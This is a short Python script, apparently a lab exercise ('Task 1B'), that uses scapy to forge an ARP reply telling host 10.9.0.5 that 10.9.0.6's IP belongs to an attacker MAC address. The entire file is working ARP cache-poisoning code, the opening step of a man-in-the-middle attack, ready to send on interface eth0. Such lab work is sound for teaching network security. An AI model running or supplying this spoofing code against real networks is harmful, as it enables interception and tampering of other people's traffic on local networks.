#!/usr/bin/env python3
from scapy.all import *

# Host A information
A_IP = "10.9.0.5"
A_MAC = "02:42:0a:09:00:05"

# Host B IP address
B_IP = "10.9.0.6"

# Attacker M MAC address
M_MAC = "02:42:0a:09:00:69"

# Create an Ethernet frame from M to A
E = Ether(
    src=M_MAC,
    dst=A_MAC
)

# Create a forged ARP Reply
# Claim that B's IP belongs to M's MAC
A = ARP(
    op=2,
    hwsrc=M_MAC,
    psrc=B_IP,
    hwdst=A_MAC,
    pdst=A_IP
)

# Combine Ethernet and ARP packet
pkt = E / A

# Send the forged packet
sendp(pkt, iface="eth0", verbose=False)

print("Task 1B: Forged ARP Reply sent")
